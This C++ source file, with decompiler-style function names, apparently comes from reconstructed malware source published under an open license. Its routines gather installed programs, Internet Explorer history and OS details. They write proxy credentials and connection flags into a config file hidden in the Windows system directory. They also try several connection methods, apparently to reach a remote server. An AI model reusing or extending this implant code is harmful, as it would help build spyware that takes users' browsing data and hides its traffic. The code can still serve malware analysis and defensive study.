// Copyright 2015 Christian Roggia. All rights reserved.
// Use of this source code is governed by an Apache 2.0 license that can be
// found in the LICENSE file.

#include "utils.hpp"

#include <iostream>
#include "StdAfx.hpp"
#include "setup.hpp"
#include "system_info.hpp"
#include "connection.hpp"

void SetNewProxyConfig()
{
	CHAR szWinDir[260];
	char szConfigPath[260];

	GetWindowsDirectory(szWinDir, 260);
	sprintf(szConfigPath, "%s\\system\\config_t.dat", szWinDir);
	
	WritePrivateProfileString("Other", "UP", "1", szConfigPath);
	WritePrivateProfileString("Other", "PS", g_nProxy_IP__TEST, szConfigPath);
	WritePrivateProfileString("Other", "PP", g_nProxy_PORT__TEST, szConfigPath);
	WritePrivateProfileString("Other", "PU", g_nProxy_USER__TEST, szConfigPath);
	WritePrivateProfileString("Other", "PW", g_nProxy_PSW__TEST, szConfigPath);
	WritePrivateProfileString("Other", "PF", "10", szConfigPath);
}

void SetProxyDisabled()
{
	char szConfigPath[260];
	CHAR szWinDir[260];

	GetWindowsDirectory(szWinDir, 260);
	sprintf(szConfigPath, "%s\\system\\config_t.dat", szWinDir);
	
	WritePrivateProfileString("Other", "UP", "0", szConfigPath);
}

void SetCheckSuccess()
{
	char szConfigPath[260];
	CHAR szWinDir[260];

	GetWindowsDirectory(szWinDir, 260);
	sprintf(szConfigPath, "%s\\system\\config_t.dat", szWinDir);
	
	WritePrivateProfileString("OtherTwo", "CheckedSuccess", "1", szConfigPath);
}

int RetriveInfo()
{
	Setup_();
	
	GetProgramFiles();
	GetIEHistory();
	GetIEVersion();
	GetOSVersion();
	
	if (TRUE == TestConnection_NoProxy()) // Method1
	{
		SetProxyDisabled();
		return CONNECTION_NO_PROXY;
	}
	
	if (TRUE == sub_1000605B()) // Method3
	{
		SetNewProxyConfig();
		return CONNECTION_METHOD3;
	}
	
	if (TRUE == sub_10006637()) // Method4
	{
		SetNewProxyConfig();
		return CONNECTION_METHOD4;
	}
	
	return NO_CONNECTION;
}